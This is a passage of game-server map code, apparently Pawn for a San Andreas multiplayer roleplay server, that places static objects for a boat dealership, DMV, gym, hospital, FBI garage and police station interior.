	CreateDynamicObject(1223, 1723.90, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1722.30, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1720.70, -1795.00, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1718.90, -1795.20, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1717.10, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1715.30, -1795.20, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1223, 1713.60, -1795.30, 21.70,   0.00, 0.00, -93.70);
	CreateDynamicObject(1211, 1744.00, -1813.00, 12.90,   0.00, 0.00, 0.00);
	CreateDynamicObject(11470, 1807.40, -1806.30, 24.00,   0.00, 0.00, -133.10);
	CreateDynamicObject(18014, 1750.00, -1810.30, 12.90,   0.00, 0.00, 73.90);
	CreateDynamicObject(18014, 1738.60, -1807.00, 12.90,   0.00, 0.00, 73.90);
	CreateDynamicObject(792, 1747.20, -1809.40, 12.60,   0.00, 0.00, -15.40);
	CreateDynamicObject(792, 1741.40, -1807.80, 12.60,   0.00, 0.00, -15.40);
	CreateDynamicObject(792, 1744.30, -1808.60, 12.60,   0.00, 0.00, -15.40);
	CreateDynamicObject(7905, 1719.30, -1747.00, 23.00,   0.00, 0.00, 21.90);
	CreateDynamicObject(5811, 1740.80, -1721.90, 16.40,   0.00, 0.00, 40.00);
	CreateDynamicObject(1985, -689.90, 942.30, 15.60,   0.00, 0.00, 0.00);
	CreateDynamicObject(1550, -692.30, 942.20, 13.00,   -1.00, 0.30, -135.50);
	CreateDynamicObject(2690, -692.50, 937.00, 14.00,   0.30, 0.00, 98.10);
	CreateDynamicObject(1478, -687.20, 924.70, 11.70,   0.00, 0.00, 0.00);
	CreateDynamicObject(19377, 1792.30, -1759.70, 12.40,   0.00, 90.40, 0.00);
	CreateDynamicObject(19377, 1781.70, -1769.60, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1792.30, -1759.70, 12.40,   0.00, 90.40, 0.00);
	CreateDynamicObject(19377, 1750.50, -1798.00, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1760.90, -1769.60, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1771.30, -1769.60, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1806.30, -1769.40, 12.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19377, 1792.20, -1769.40, 12.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19377, 1740.00, -1798.20, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1750.50, -1779.20, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1750.50, -1788.50, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1750.50, -1788.50, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1792.30, -1759.70, 12.40,   0.00, 90.40, 0.00);
	CreateDynamicObject(19377, 1801.10, -1759.80, 12.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19377, 1802.70, -1769.40, 12.40,   0.00, 90.00, 0.00);
	CreateDynamicObject(19377, 1750.50, -1769.60, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1806.40, -1761.60, 12.50,   0.00, 89.20, 0.00);
	CreateDynamicObject(19377, 1750.50, -1760.20, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.20, -1745.80, 12.40,   0.20, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.00, -1769.80, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.00, -1779.30, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.00, -1788.70, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.10, -1760.20, 12.40,   0.00, -90.00, 0.00);
	CreateDynamicObject(19377, 1750.60, -1751.30, 12.40,   0.20, -90.00, 0.00);
	CreateDynamicObject(19377, 1740.20, -1751.30, 12.40,   0.20, -90.00, 0.00);
	CreateDynamicObject(1353, 1739.40, -1791.90, 16.40,   0.00, 0.00, 0.00);
	CreateDynamicObject(1353, 1739.40, -1788.80, 16.40,   0.00, 0.00, 0.00);
	CreateDynamicObject(6056, 1472.20, -1041.30, 27.50,   0.00, 0.00, 151.90);
	CreateDynamicObject(1455, 2493.40, -1696.80, 1014.30,   0.00, 0.00, 0.00);
	CreateDynamicObject(1455, 2493.40, -1697.60, 1014.30,   0.00, 0.00, 0.00);
	CreateDynamicObject(1455, 2493.40, -1697.60, 1014.30,   0.00, 0.00, 0.00);
	CreateDynamicObject(1455, 2493.00, -1698.00, 1014.30,   0.00, 0.00, 0.00);
	CreateDynamicObject(2785, 1751.38, -1749.89, 21.13,   0.10, -0.20, 90.10);

	//boat dealership
	CreateDynamicObject(6300, 220.0, -1893.2, -5.9, 0.0, 0.0, 0.0);
	CreateDynamicObject(1684, 193.4, -1924.6, 3.6, 0.0, 0.0, 89.6);
	CreateDynamicObject(1617, 193.7, -1919.6, 4.4, 0.0, 0.0, -90.8);
	CreateDynamicObject(11431, 193.3, -1893.0, 3.5, 0.0, 0.0, -89.6);
	CreateDynamicObject(3886, 201.6, -1937.0, 1.2, 0.0, 0.0, -179.1);
	CreateDynamicObject(3886, 213.6, -1936.7, 1.2, 0.0, 0.0, -179.1);
	CreateDynamicObject(3886, 226.7, -1936.8, 1.2, 0.0, 0.0, -179.1);
	CreateDynamicObject(3886, 240.4, -1937.0, 1.2, 0.0, 0.0, -179.3);
	CreateDynamicObject(1686, 213.6, -1940.7, 2.0, 0.0, 0.0, -88.4);
	CreateDynamicObject(1686, 201.6, -1941.1, 2.0, 0.0, 0.0, -89.5);
	CreateDynamicObject(1686, 226.7, -1940.7, 2.0, 0.0, 0.0, -89.7);
	CreateDynamicObject(1686, 240.5, -1941.3, 2.1, 0.0, 0.0, -89.7);
	CreateDynamicObject(16359, 194.3, -1905.9, 1.9, 0.0, 0.0, -1.2);
	CreateDynamicObject(1216, 199.2, -1931.0, 2.8, 0.0, 0.0, 178.5);
	CreateDynamicObject(12925, 201.2, -1872.4, 2.1, 0.0, 0.0, -90.3);
	CreateDynamicObject(10844, 239.3, -1906.9, 5.0, 0.0, 0.0, -89.7);
	CreateDynamicObject(9244, 230.5, -1873.7, 7.3, 0.0, 0.0, -89.8);

    //new dmv fences
	CreateDynamicObject(1319,2071.80004883,-1911.19995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(ws_ref_bollard) (1)
    CreateDynamicObject(1319,2071.69995117,-1916.69995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(ws_ref_bollard) (2)
    CreateDynamicObject(1319,2071.69921875,-1916.69921875,13.10000038,0.00000000,0.00000000,0.00000000); //object(ws_ref_bollard) (3)
    CreateDynamicObject(970,2071.69995117,-1899.30004883,13.00000000,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (16)
    CreateDynamicObject(970,2071.69995117,-1918.80004883,13.00000000,0.00000000,0.00000000,269.99951172); //object(fencesmallb) (21)
    CreateDynamicObject(970,2071.69995117,-1920.59997559,13.00000000,0.00000000,0.00000000,269.99450684); //object(fencesmallb) (22)
    CreateDynamicObject(970,2069.50000000,-1922.69995117,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (23)
    CreateDynamicObject(970,2065.39990234,-1922.69995117,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (24)
    CreateDynamicObject(970,2061.50000000,-1922.69995117,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (25)
    CreateDynamicObject(1319,2059.30004883,-1922.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(ws_ref_bollard) (4)
    CreateDynamicObject(1319,2054.50000000,-1922.59997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(ws_ref_bollard) (5)
    CreateDynamicObject(970,2052.30004883,-1922.50000000,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (26)
    CreateDynamicObject(970,2048.10009766,-1922.50000000,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (27)
    CreateDynamicObject(970,2044.09997559,-1922.50000000,13.00000000,0.00000000,0.00000000,179.99450684); //object(fencesmallb) (28)
    CreateDynamicObject(970,2071.69995117,-1903.30004883,13.00000000,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (29)
    CreateDynamicObject(970,2071.69995117,-1907.40002441,13.00000000,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (30)
    CreateDynamicObject(970,2071.69995117,-1909.00000000,13.00000000,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (31)
    CreateDynamicObject(1231,2072.10009766,-1916.69995117,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (1)
    CreateDynamicObject(1231,2072.19995117,-1911.00000000,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (2)
    CreateDynamicObject(1231,2054.00000000,-1923.09997559,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (3)
    CreateDynamicObject(1231,2059.69995117,-1923.00000000,15.30000019,0.00000000,0.00000000,0.00000000); //object(streetlamp2) (5)
    CreateDynamicObject(1231,2050.00000000,-1917.90002441,15.30000019,0.00000000,0.00000000,266.00000000); //object(streetlamp2) (6)
    CreateDynamicObject(1231,2049.50000000,-1906.69995117,15.30000019,0.00000000,0.00000000,265.99548340); //object(streetlamp2) (7)
    CreateDynamicObject(1231,2057.00000000,-1899.90002441,15.30000019,0.00000000,0.00000000,265.99548340); //object(streetlamp2) (8)
    //GymBlock
	CreateDynamicObject(994, 2222.465088, -1715.447388, 12.628170, 0.0000, 0.0000, 263.1245);
	CreateDynamicObject(994, 2223.253418, -1709.089966, 12.725977, 0.0000, 0.0000, 263.9840);
	CreateDynamicObject(994, 2232.644287, -1727.048462, 12.647192, 0.0000, 0.0000, 180.0773);
	CreateDynamicObject(994, 2239.051270, -1727.090210, 12.647192, 0.0000, 0.0000, 180.0773);
	CreateDynamicObject(994, 2238.903076, -1719.262451, 12.652877, 0.0000, 0.0000, 270.0773);
	CreateDynamicObject(994, 2221.543945, -1722.587158, 12.662817, 0.0000, 0.0000, 315.0773);
	CreateDynamicObject(994, 2224.709717, -1709.026855, 12.541059, 0.0000, 0.0000, 358.3585);

	//DMV
    CreateDynamicObject(4199,1958.59997559,-1132.00000000,984.40002441,0.00000000,0.00000000,0.00000000); //object(garages1_lan) (1)
    CreateDynamicObject(14603,1961.30004883,-1135.59997559,988.31109619,0.00000000,0.00000000,270.00000000); //object(bikeschl_main) (1)
    CreateDynamicObject(2166,1958.19995117,-1130.00000000,986.50000000,0.00000000,0.00000000,180.00000000); //object(med_office_desk_2) (2)
    CreateDynamicObject(2165,1958.17993164,-1129.19946289,986.50000000,0.00000000,0.00000000,270.00000000); //object(med_office_desk_1) (2)
    CreateDynamicObject(1714,1957.09997559,-1129.69995117,986.50000000,0.00000000,0.00000000,88.00000000); //object(kb_swivelchair1) (1)
    CreateDynamicObject(1738,1957.50000000,-1143.09997559,987.20001221,0.00000000,0.00000000,0.00000000); //object(cj_radiator_old) (1)
    CreateDynamicObject(1808,1956.90002441,-1136.09997559,986.50000000,0.00000000,0.00000000,90.00000000); //object(cj_watercooler2) (1)
    CreateDynamicObject(14527,1960.00000000,-1135.50000000,987.59997559,0.00000000,0.00000000,0.00000000); //object(fannyfan) (1)
    CreateDynamicObject(14772,1956.80004883,-1128.09997559,989.70001221,0.00000000,0.00000000,48.00000000); //object(int3int_low_tv) (1)
    CreateDynamicObject(1736,1957.59997559,-1142.90002441,989.29998779,0.00000000,0.00000000,182.00000000); //object(cj_stags_head) (1)
    CreateDynamicObject(1721,1963.09997559,-1129.09997559,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (1)
    CreateDynamicObject(2725,1962.83996582,-1128.40002441,986.80004883,0.00000000,0.00000000,0.00000000); //object(lm_striptable) (1)
    CreateDynamicObject(1721,1963.09899902,-1129.80004883,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (2)
    CreateDynamicObject(1721,1963.09899902,-1130.50000000,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (3)
    CreateDynamicObject(1721,1963.09899902,-1131.19995117,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (4)
    CreateDynamicObject(1721,1963.09899902,-1131.90002441,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (5)
    CreateDynamicObject(1721,1963.09899902,-1132.59997559,986.59997559,0.00000000,0.00000000,90.00000000); //object(est_chair1) (6)
    CreateDynamicObject(2725,1962.83496094,-1133.30004883,986.79998779,0.00000000,0.00000000,0.00000000); //object(lm_striptable) (2)
    CreateDynamicObject(2816,1962.80004883,-1133.30004883,987.29998779,0.00000000,0.00000000,0.00000000); //object(gb_bedmags01) (1)
    CreateDynamicObject(2826,1962.80004883,-1128.40002441,987.29998779,0.00000000,0.00000000,0.00000000); //object(gb_novels04) (1)
    CreateDynamicObject(2828,1957.50000000,-1131.09997559,987.29998779,0.00000000,0.00000000,0.00000000); //object(gb_ornament02) (1)
    CreateDynamicObject(14532,1962.40002441,-1142.50000000,987.50000000,0.00000000,0.00000000,0.00000000); //object(tv_stand_driv) (1)
    CreateDynamicObject(2186,1957.19995117,-1140.09997559,986.50000000,0.00000000,0.00000000,92.00000000); //object(photocopier_1) (1)
    CreateDynamicObject(1500,1956.50000000,-1133.94995117,986.50000000,0.00000000,0.00000000,270.00000000); //object(gen_doorext05) (1)
    CreateDynamicObject(1998,1961.69995117,-1135.30004883,986.50000000,0.00000000,0.00000000,90.00000000); //object(officedesk1l) (1)
    CreateDynamicObject(1810,1961.40002441,-1136.00000000,986.50000000,0.00000000,0.00000000,182.00000000); //object(cj_foldchair) (1)
    CreateDynamicObject(1810,1959.00000000,-1130.59997559,986.50000000,0.00000000,0.00000000,227.99450684); //object(cj_foldchair) (2)
    CreateDynamicObject(1806,1961.50000000,-1134.40002441,986.50000000,0.00000000,0.00000000,132.00000000); //object(med_office_chair) (1)
    CreateDynamicObject(2614,1963.19995117,-1136.50000000,988.90002441,0.00000000,0.00000000,270.00000000); //object(cj_us_flag) (2)
    CreateDynamicObject(3077,1959.90002441,-1143.19995117,986.50000000,0.00000000,0.00000000,0.00000000); //object(nf_blackboard) (1)
    CreateDynamicObject(2241,1957.09997559,-1136.80004883,987.00000000,0.00000000,0.00000000,0.00000000); //object(plant_Weed_5) (1)
    CreateDynamicObject(1810,1960.79980469,-1135.89941406,986.50000000,0.00000000,0.00000000,157.99438477); //object(cj_foldchair) (3)
    CreateDynamicObject(1721,1962.80004883,-1140.59997559,986.50000000,0.00000000,0.00000000,180.00000000); //object(est_chair1) (7)
    CreateDynamicObject(1721,1962.09997559,-1140.59997559,986.50000000,0.00000000,0.00000000,179.99450684); //object(est_chair1) (8)
    CreateDynamicObject(1721,1962.80004883,-1139.50000000,986.50000000,0.00000000,0.00000000,179.99450684); //object(est_chair1) (9)
    CreateDynamicObject(1721,1962.09997559,-1139.50000000,986.50000000,0.00000000,0.00000000,179.99450684); //object(est_chair1) (10)
    CreateDynamicObject(1721,1962.80004883,-1138.50000000,986.50000000,0.00000000,0.00000000,179.99450684); //object(est_chair1) (11)
    CreateDynamicObject(1721,1962.09997559,-1138.50000000,986.50000000,0.00000000,0.00000000,179.99450684); //object(est_chair1) (12)

    // New LSPD Door
    lspddoor = CreateDynamicObject(19859, 1535.917724, -1634.837768, -25.304058, 0.00000, 0.00000, 0.00000); //Door

    // ALl Saints
    CreateDynamicObject(19449, 1147.07410, -1290.91199, 14.43624,   1.00000, 0.00000, 271.09341);
    CreateDynamicObject(19449, 1137.46045, -1290.96423, 17.66048,   1.00000, 0.00000, 271.19141);
    CreateDynamicObject(19449, 1147.05237, -1290.89392, 17.84427,   1.00000, 0.00000, 271.09341);
    CreateDynamicObject(19449, 1147.05237, -1290.89392, 14.43624,   1.00000, 0.00000, 271.09341);
    CreateDynamicObject(19449, 1137.46045, -1290.96423, 14.33120,   1.00000, 0.00000, 271.19141);
    CreateDynamicObject(19449, 1137.46045, -1290.96423, 14.33120,   1.00000, 0.00000, 271.19141);
    CreateDynamicObject(19913, 1114.11853, -1368.34448, 18.21981,   0.00000, 0.00000, 0.00000);
    saintsgate1 = CreateDynamicObject(19912, 1089.17590, -1368.28345, 15.52991,   0.00000, 0.00000, 0.01315);
    saintsgate2 = CreateDynamicObject(19912, 1150.60840, -1368.16711, 15.52991,   0.00000, 0.00000, 0.73585);
    CreateDynamicObject(16375, 1182.71521, -1324.96460, 30.92355,   0.00000, 0.00000, 356.76877);
    CreateDynamicObject(19121, 1161.40637, -1322.29651, 30.97467,   0.00000, 0.00000, 357.04742);
    CreateDynamicObject(19121, 1154.53967, -1321.27930, 30.97467,   0.00000, 0.00000, 357.04742);
    CreateDynamicObject(19121, 1169.70728, -1321.75562, 30.97467,   0.00000, 0.00000, 357.04742);
    CreateDynamicObject(19121, 1169.49207, -1301.52173, 30.97467,   0.00000, 0.00000, 357.04742);
    CreateDynamicObject(19121, 1154.40918, -1301.68213, 30.97467,   0.00000, 0.00000, 357.04742);
    CreateDynamicObject(19121, 1161.17981, -1300.99500, 30.97467,   0.00000, 0.00000, 357.04742);

    // FBI Garage
    CreateDynamicObject(19913, 1751.15210, -1320.85339, 13.63357,   0.00000, 0.00000, 332.84305);
    CreateDynamicObject(19913, 1795.13757, -1320.49487, 17.90217,   0.00000, 0.00000, 0.43935);
    CreateDynamicObject(19913, 1753.09839, -1302.98059, 13.62854,   0.00000, 0.00000, 14.91025);
    fbigate = CreateDynamicObject(19912, 1820.18591, -1308.78442, 15.36408,   0.00000, 0.00000, 89.85793);
    CreateDynamicObject(16375, 1844.31653, -1292.66943, 130.92059,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(16375, 1844.83984, -1316.02954, 130.95018,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1813.15869, -1288.66504, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1823.88062, -1295.34802, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1814.83118, -1294.40674, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1786.56152, -1310.68054, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1812.88489, -1309.01758, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1820.01868, -1314.48816, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1829.64111, -1312.90479, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1829.64111, -1312.90479, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1833.62659, -1303.37915, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1833.62659, -1303.37915, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1830.89478, -1296.82849, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1832.07874, -1289.64050, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1832.57581, -1275.99255, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1823.50610, -1271.73535, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1814.21191, -1272.47131, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1812.69556, -1281.67725, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1812.69556, -1281.67725, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(4642, 1786.74500, -1303.29395, 132.19421,   0.00000, 0.00000, 87.18709);
    CreateDynamicObject(19121, 1811.35889, -1300.15295, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1800.96399, -1295.62415, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1798.40283, -1310.98584, 131.23106,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1789.89246, -1297.44531, 131.23106,   0.00000, 0.00000, 0.00000);

	// New LSPD
    // Police department
    CreateDynamicObject(19452,1578.2000000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (1)
	CreateDynamicObject(19452,1578.2002000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (2)
	CreateDynamicObject(19452,1588.7000000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (3)
	CreateDynamicObject(19452,1581.7002000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (4)
	CreateDynamicObject(19452,1581.7002000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (5)
	CreateDynamicObject(19452,1585.2002000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (6)
	CreateDynamicObject(19452,1585.2002000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (7)
	CreateDynamicObject(19452,1588.7002000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (8)
	CreateDynamicObject(19452,1592.2000000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (9)
	CreateDynamicObject(19452,1592.2002000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (10)
	CreateDynamicObject(19452,1595.5996000,-1713.0000000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (11)
	CreateDynamicObject(19452,1595.5898000,-1722.5996000,-37.9000020,0.0000000,90.0000000,0.0000000); //object(cs_detrok02) (12)
	CreateDynamicObject(19358,1576.5000000,-1709.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (1)
	CreateDynamicObject(19358,1595.5200000,-1708.2000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (2)
	CreateDynamicObject(19358,1592.4000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (3)
	CreateDynamicObject(19358,1589.2000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (4)
	CreateDynamicObject(19358,1586.0000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (5)
	CreateDynamicObject(19358,1583.0000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (6)
	CreateDynamicObject(19358,1579.8000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (7)
	CreateDynamicObject(19358,1577.0000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (8)
	CreateDynamicObject(19358,1597.2998000,-1709.7998000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (9)
	CreateDynamicObject(1536,1586.2998000,-1708.2568000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorext15) (1)
	CreateDynamicObject(1536,1589.3199000,-1708.2300000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(gen_doorext15) (2)
	CreateDynamicObject(19358,1576.5000000,-1712.7000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (10)
	CreateDynamicObject(19358,1576.5000000,-1715.9000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (11)
	CreateDynamicObject(19358,1576.5000000,-1719.1000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (12)
	CreateDynamicObject(19358,1576.5000000,-1721.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (13)
	CreateDynamicObject(19358,1576.5000000,-1725.0000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (14)
	CreateDynamicObject(19358,1597.3000000,-1712.6000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (15)
	CreateDynamicObject(19358,1595.9000000,-1708.2002000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (16)
	CreateDynamicObject(19358,1597.3000000,-1715.8000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (17)
	CreateDynamicObject(19358,1597.2998000,-1719.0000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (18)
	CreateDynamicObject(19358,1597.2998000,-1722.2002000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (19)
	CreateDynamicObject(19358,1597.2998000,-1725.4004000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (20)
	CreateDynamicObject(19358,1584.4000000,-1709.4000000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (21)
	CreateDynamicObject(19358,1595.8000000,-1717.4000000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (22)
	CreateDynamicObject(19358,1593.0000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (24)
	CreateDynamicObject(19404,1584.4004000,-1712.5996000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(boigagr_sfw) (1)
	CreateDynamicObject(19358,1584.4004000,-1715.7998000,-36.0999980,0.0000000,0.0000000,0.0000000); //object(road_sfw12) (25)
	CreateDynamicObject(19358,1591.0000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (26)
	CreateDynamicObject(19388,1586.0996000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw15) (1)
	CreateDynamicObject(19358,1589.0000000,-1717.4004000,-36.0999980,0.0000000,0.0000000,90.0000000); //object(road_sfw12) (27)
	CreateDynamicObject(1649,1584.4000000,-1712.5000000,-34.5000000,0.0000000,0.0000000,90.0000000); //object(wglasssmash) (1)
	CreateDynamicObject(1649,1584.4004000,-1712.5000000,-34.5000000,0.0000000,0.0000000,270.0000000); //object(wglasssmash) (2)
	//CreateDynamicObject(1495,1585.3101000,-1717.4000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(gen_doorext01) (1)
	CreateDynamicObject(1706,1590.4000000,-1708.8000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(kb_couch03) (1)
	CreateDynamicObject(1706,1592.5000000,-1708.8000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(kb_couch03) (2)
	CreateDynamicObject(1706,1594.6000000,-1708.8000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(kb_couch03) (4)
	CreateDynamicObject(1706,1596.7000000,-1709.9000000,-37.7999990,0.0000000,0.0000000,270.0000000); //object(kb_couch03) (5)
	CreateDynamicObject(949,1585.7998000,-1708.7002000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (1)
	CreateDynamicObject(949,1596.7000000,-1708.8000000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (2)
	CreateDynamicObject(1706,1596.7000000,-1712.1000000,-37.7999990,0.0000000,0.0000000,270.0000000); //object(kb_couch03) (6)
	CreateDynamicObject(1706,1596.7000000,-1714.3000000,-37.7999990,0.0000000,0.0000000,270.0000000); //object(kb_couch03) (7)
	CreateDynamicObject(1706,1595.5000000,-1716.8000000,-37.7999990,0.0000000,0.0000000,180.0000000); //object(kb_couch03) (8)
	CreateDynamicObject(949,1596.7000000,-1716.8000000,-37.2000010,0.0000000,0.0000000,0.0000000); //object(plant_pot_4) (3)
	CreateDynamicObject(1706,1593.3000000,-1716.8000000,-37.7999990,0.0000000,0.0000000,179.9945100); //object(kb_couch03) (9)
	CreateDynamicObject(1706,1591.1000000,-1716.8000000,-37.7999990,0.0000000,0.0000000,179.9945100); //object(kb_couch03) (10)
	CreateDynamicObject(1706,1588.9000000,-1716.8000000,-37.7999990,0.0000000,0.0000000,179.9945100); //object(kb_couch03) (11)
	CreateDynamicObject(2319,1592.5000000,-1712.6000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(cj_tv_table5) (1)
	CreateDynamicObject(2319,1590.1000000,-1712.6000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(cj_tv_table5) (2)
	CreateDynamicObject(2853,1590.2000000,-1712.5000000,-37.2999990,0.0000000,0.0000000,0.0000000); //object(gb_bedmags03) (1)
	CreateDynamicObject(2854,1591.1000000,-1712.6000000,-37.2999990,0.0000000,0.0000000,0.0000000); //object(gb_bedmags04) (1)
	CreateDynamicObject(2855,1592.6000000,-1712.6000000,-37.2999990,0.0000000,0.0000000,0.0000000); //object(gb_bedmags05) (1)
	CreateDynamicObject(2852,1593.4000000,-1712.6000000,-37.2999990,0.0000000,0.0000000,0.0000000); //object(gb_bedmags02) (1)
	CreateDynamicObject(2700,1597.2000000,-1708.4000000,-35.0999980,0.0000000,0.0000000,220.4877000); //object(cj_sex_tv2) (1)
	CreateDynamicObject(2202,1582.9000000,-1708.8000000,-37.7999990,0.0000000,0.0000000,0.0000000); //object(photocopier_2) (1)
	CreateDynamicObject(2198,1583.8000000,-1712.1000000,-37.7999990,0.0000000,0.0000000,270.0000000); //object(med_office2_desk_3) (1)
	CreateDynamicObject(1671,1578.3000000,-1718.9000000,-37.4000020,0.0000000,0.0000000,180.0000000); //object(swivelchair_a) (1)
